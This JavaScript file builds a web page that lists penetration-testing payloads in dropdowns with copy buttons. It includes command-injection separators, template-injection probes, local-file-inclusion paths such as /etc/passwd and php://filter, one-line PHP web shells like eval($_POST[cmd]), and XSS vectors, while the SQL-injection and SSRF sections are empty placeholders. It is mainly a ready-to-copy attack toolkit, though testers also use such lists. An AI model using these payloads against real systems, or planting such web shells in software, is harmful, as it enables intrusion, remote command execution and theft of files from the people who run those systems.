const payloads = {
    "Command_Injection": {
        "Basic": [
            "| <command>",
            "&& <command>",
            "; <command>",
            "%0a <command>",
            "'; <command>",
            "\"; <command>",
            "\`<command>\`",
            "\$(<command>)"
        ],
        "Bypass": [
            "${IFS}"
        ]
    },
    "SQL_injection": {
        "Boolean Base": [
            "b1",
            "b2"
        ],
        "Error Base": [
            "e1",
            "e2"
        ]
    },
    "SSRF": {
        "IP": [
            ""
        ]
    },
    "SSTI": {
        "flow": [
            "<img src=\"https://camo.githubusercontent.com/e181cc488687817780ecc81ef6bbd57be7b2a2c5/68747470733a2f2f692e696d6775722e636f6d2f47565a655671362e706e67\">"
        ],
        "Payload": [
            "${7*7}",
            "{{7*}}",
            "{{7*‘7’}}",
            "a{comment}b",
            "${\"z\".join(\"ab\")}"
        ]
    },
    "Local_File_Inclusion": {
        "PATH": [
            "…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/",
            "/etc/passwd",
            "/etc/httpd/conf/httpd.conf",
            "/tmp/sess_{SESSION_ID}",
            "/proc/self/environ"
        ],
        "wrapper": [
            "php://filter/read=convert.base64-encode/resource=/path/to/file",
            "php://input"
        ]
    },
    "Web_Shell": {
        "PHP": [
            "<?php eval($_POST[cmd]);?>",
            "<?php echo `$_GET[1]`;",
            "<?php $_GET['a']($_GET['b']); ?>"
        ],
    },
    "XSS": {
        "Vector": [
            "<script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "`<video src=x onerror=alert(1)>`",
        ],
        "Locator": [
            "'';!--\"<XSS>=&{()}"
        ]
    }
}
function copy(str){
    var $temp = $("<input>");
    $("body").append($temp);
    $temp.val(str).select();
    document.execCommand("copy");
    $temp.remove();
}

for(let s in payloads){
    let sel = $(`<select class="ui dropdown payload-select" name="${s}" id="${s}">`);
    let holder = $('<option value=""></option>').text(s);
    sel.append(holder)
    for(let p in payloads[s]){
        let opt = $(`<option value="${p}"></option>`).text(p);
        sel.append(opt)
    }
    $('#payload-select-container').append(sel);
}

$('.payload-select').change(e=>{
    //select one
    const id = e.target.name;
    const value = $(`#${id}`).dropdown('get value');
    if(! value) return;

    //clear other select
    for(let s in payloads){
        if(s != id){
            $(`#${s}`).dropdown('restore defaults');
        }
    }

    //clear old payload
    $('#payload-container').text('');

    //display payload
    const ps = payloads[id][value];
    for(let i in ps){
        let msg = $('<div class="ui olive message payload-message"></div>');
        let pay = $('<div class="payload"></div>').innerHTML = ps[i];
        let co = $('<div class="ui icon button copy-button" data-tooltip="COPY"><i class="copy outline icon"></i></div>');
        co.click(()=>{
            copy(ps[i]);
            co.attr('data-tooltip', 'OK!');
            setTimeout(() => {
                co.attr('data-tooltip', 'COPY');
            }, 500);
        })
        msg.append(pay);
        msg.append(co);
        $('#payload-container').append(msg);
    }
    
    
})
